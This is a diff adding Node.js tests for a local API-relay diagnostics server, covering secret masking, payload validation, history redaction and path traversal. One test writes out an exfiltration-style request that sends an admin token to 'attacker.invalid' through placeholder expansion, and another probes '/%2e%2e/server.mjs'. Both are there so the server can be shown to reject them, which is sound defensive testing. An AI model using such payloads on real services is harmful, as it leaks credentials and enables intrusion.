@@ -2,6 +2,7 @@ import assert from 'node:assert/strict';
 import { mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
 import path from 'node:path';
+import { Readable, Writable } from 'node:stream';
 import test from 'node:test';
 
 import { loadEnvConfig, parseDotenv } from '../lib/env.mjs';
@@ -10,6 +11,66 @@ import { prepareOutboundRequest } from '../lib/http-client.mjs';
 import { maskSecrets } from '../lib/masking.mjs';
 import { buildPresets } from '../lib/presets.mjs';
 import { summarizeExchange } from '../lib/summary.mjs';
+import { createDiagnosticsServer } from '../server.mjs';
+
+async function dispatch(server, {
+  method = 'GET',
+  url = '/',
+  headers = {},
+  body
+} = {}) {
+  const handler = server.listeners('request')[0];
+  const chunks = body === undefined ? [] : [Buffer.from(typeof body === 'string' ? body : JSON.stringify(body))];
+  const req = Readable.from(chunks);
+  req.method = method;
+  req.url = url;
+  req.headers = {
+    host: '127.0.0.1:5179',
+    ...headers
+  };
+
+  const responseChunks = [];
+  const res = new Writable({
+    write(chunk, _encoding, callback) {
+      responseChunks.push(Buffer.from(chunk));
+      callback();
+    }
+  });
+  res.statusCode = 200;
+  res.headers = {};
+  res.writeHead = (statusCode, responseHeaders = {}) => {
+    res.statusCode = statusCode;
+    res.headers = {
+      ...res.headers,
+      ...responseHeaders
+    };
+    return res;
+  };
+
+  const finished = new Promise((resolve) => res.on('finish', resolve));
+  await handler(req, res);
+  await finished;
+
+  const bodyText = Buffer.concat(responseChunks).toString('utf8');
+  return {
+    status: res.statusCode,
+    headers: res.headers,
+    bodyText,
+    json: bodyText ? JSON.parse(bodyText) : undefined
+  };
+}
+
+async function writeDiagnosticsEnv(dir) {
+  await writeFile(path.join(dir, '.env'), [
+    'UNODE_BASE_URL=https://www.unodetech.xyz',
+    'UNODE_RELAY_API_KEY=sk-unode-secret-123456',
+    'NEW_API_BASE_URL=https://alrouter.ai',
+    'NEW_API_RELAY_API_KEY=sk-router-secret-abcdef',
+    'NEW_API_CHANNEL_ID=4',
+    'NEW_API_ADMIN_ACCESS_TOKEN=admin-access-secret-123456',
+    'NEW_API_ADMIN_USER_ID=99'
+  ].join('\n'));
+}
 
 test('parseDotenv handles comments, quotes, and equals signs', () => {
   const env = parseDotenv(`
@@ -311,6 +372,209 @@ test('prepareOutboundRequest expands env placeholders and builds URL', () => {
   assert.equal(prepared.url, 'https://alrouter.ai/v1/chat/completions');
   assert.equal(prepared.headers.authorization, 'Bearer sk-router-4');
   assert.equal(prepared.bodyText, '{"model":"claude-sonnet-4-6"}');
+});
+
+test('diagnostics server config route does not expose raw secrets', async () => {
+  const dir = await mkdtemp(path.join(tmpdir(), 'unode-diag-server-'));
+  try {
+    await writeDiagnosticsEnv(dir);
+    const server = createDiagnosticsServer({
+      repoRoot: dir,
+      historyPath: path.join(dir, 'history.jsonl')
+    });
+
+    const response = await dispatch(server, { url: '/api/config' });
+
+    assert.equal(response.status, 200);
+    assert.deepEqual(Object.keys(response.json).sort(), ['display', 'missing']);
+    const payload = JSON.stringify(response.json);
+    assert.equal(payload.includes('sk-unode-secret-123456'), false);
+    assert.equal(payload.includes('sk-router-secret-abcdef'), false);
+    assert.equal(payload.includes('admin-access-secret-123456'), false);
+    assert.equal(response.json.display.NEW_API_RELAY_API_KEY, 'sk-r...cdef');
+    assert.equal(response.json.display.NEW_API_ADMIN_ACCESS_TOKEN, 'admi...3456');
+  } finally {
+    await rm(dir, { recursive: true, force: true });
+  }
+});
+
+test('diagnostics server send route rejects disallowed outbound origins before fetch', async () => {
+  const dir = await mkdtemp(path.join(tmpdir(), 'unode-diag-server-'));
+  let fetchCalls = 0;
+  try {
+    await writeDiagnosticsEnv(dir);
+    const server = createDiagnosticsServer({
+      repoRoot: dir,
+      historyPath: path.join(dir, 'history.jsonl'),
+      fetchImpl: async () => {
+        fetchCalls += 1;
+        return new Response('{}', { status: 200 });
+      }
+    });
+
+    const response = await dispatch(server, {
+      method: 'POST',
+      url: '/api/send',
+      body: {
+        method: 'POST',
+        baseUrl: '${NEW_API_BASE_URL}',
+        path: 'https://attacker.invalid/steal?token=${NEW_API_ADMIN_ACCESS_TOKEN}',
+        headers: {
+          authorization: 'Bearer ${NEW_API_RELAY_API_KEY}'
+        },
+        body: { prompt: 'hello' }
+      }
+    });
+    const ignoredBaseUrl = await dispatch(server, {
+      method: 'POST',
+      url: '/api/send',
+      body: {
+        method: 'POST',
+        baseUrl: 'https://attacker.invalid',
+        path: '${NEW_API_BASE_URL}/v1/messages',
+        headers: {},
+        body: { prompt: 'hello' }
+      }
+    });
+
+    assert.equal(response.status, 400);
+    assert.equal(ignoredBaseUrl.status, 400);
+    assert.equal(response.json.error, 'invalid_request');
+    assert.equal(fetchCalls, 0);
+  } finally {
+    await rm(dir, { recursive: true, force: true });
+  }
+});
+
+test('diagnostics server send route rejects malformed request payloads', async () => {
+  const dir = await mkdtemp(path.join(tmpdir(), 'unode-diag-server-'));
+  let fetchCalls = 0;
+  try {
+    await writeDiagnosticsEnv(dir);
+    const server = createDiagnosticsServer({
+      repoRoot: dir,
+      historyPath: path.join(dir, 'history.jsonl'),
+      fetchImpl: async () => {
+        fetchCalls += 1;
+        return new Response('{}', { status: 200 });
+      }
+    });
+
+    const nullPayload = await dispatch(server, {
+      method: 'POST',
+      url: '/api/send',
+      body: 'null'
+    });
+    const invalidMethod = await dispatch(server, {
+      method: 'POST',
+      url: '/api/send',
+      body: {
+        method: 'TRACE',
+        baseUrl: '${NEW_API_BASE_URL}',
+        path: '/v1/messages',
+        headers: {}
+      }
+    });
+    const invalidHeaders = await dispatch(server, {
+      method: 'POST',
+      url: '/api/send',
+      body: {
+        method: 'POST',
+        baseUrl: '${NEW_API_BASE_URL}',
+        path: '/v1/messages',
+        headers: []
+      }
+    });
+    const missingPath = await dispatch(server, {
+      method: 'POST',
+      url: '/api/send',
+      body: {
+        method: 'POST',
+        baseUrl: '${NEW_API_BASE_URL}',
+        headers: {}
+      }
+    });
+
+    assert.equal(nullPayload.status, 400);
+    assert.equal(invalidMethod.status, 400);
+    assert.equal(invalidHeaders.status, 400);
+    assert.equal(missingPath.status, 400);
+    assert.equal(fetchCalls, 0);
+  } finally {
+    await rm(dir, { recursive: true, force: true });
+  }
+});
+
+test('diagnostics server send route redacts exact non-sk env secrets from returned and stored history', async () => {
+  const dir = await mkdtemp(path.join(tmpdir(), 'unode-diag-server-'));
+  const historyPath = path.join(dir, 'history.jsonl');
+  try {
+    await writeDiagnosticsEnv(dir);
+    const server = createDiagnosticsServer({
+      repoRoot: dir,
+      historyPath,
+      fetchImpl: async (_url, init) => {
+        assert.equal(String(init.body).includes('admin-access-secret-123456'), true);
+        return new Response(JSON.stringify({
+          echoed: 'admin-access-secret-123456',
+          nested: {
+            note: 'response mentioned admin-access-secret-123456'
+          }
+        }), {
+          status: 200,
+          headers: {
+            'content-type': 'application/json',
+            'x-oneapi-request-id': 'admin-access-secret-123456'
+          }
+        });
+      }
+    });
+
+    const response = await dispatch(server, {
+      method: 'POST',
+      url: '/api/send',
+      body: {
+        presetId: 'redaction-probe',
+        target: 'alrouter',
+        method: 'POST',
+        baseUrl: '${NEW_API_BASE_URL}',
+        path: '/v1/messages',
+        headers: {
+          authorization: 'Bearer ${NEW_API_RELAY_API_KEY}',
+          'x-admin-token': '${NEW_API_ADMIN_ACCESS_TOKEN}',
+          'content-type': 'application/json'
+        },
+        body: {
+          prompt: 'send admin-access-secret-123456',
+          tokenCopy: '${NEW_API_ADMIN_ACCESS_TOKEN}'
+        }
+      }
+    });
+
+    assert.equal(response.status, 200);
+    assert.equal(JSON.stringify(response.json).includes('admin-access-secret-123456'), false);
+    const raw = await readFile(historyPath, 'utf8');
+    assert.equal(raw.includes('admin-access-secret-123456'), false);
+  } finally {
+    await rm(dir, { recursive: true, force: true });
+  }
+});
+
+test('diagnostics server static route rejects traversal outside public directory', async () => {
+  const dir = await mkdtemp(path.join(tmpdir(), 'unode-diag-server-'));
+  try {
+    const server = createDiagnosticsServer({
+      repoRoot: dir,
+      publicDir: path.join(dir, 'public'),
+      historyPath: path.join(dir, 'history.jsonl')
+    });
+
+    const response = await dispatch(server, { url: '/%2e%2e/server.mjs' });
+
+    assert.ok(response.status === 403 || response.status === 404);
+  } finally {
+    await rm(dir, { recursive: true, force: true });
+  }
 });
 
 test('summarizeExchange detects Claude Code session and web search usage', () => {
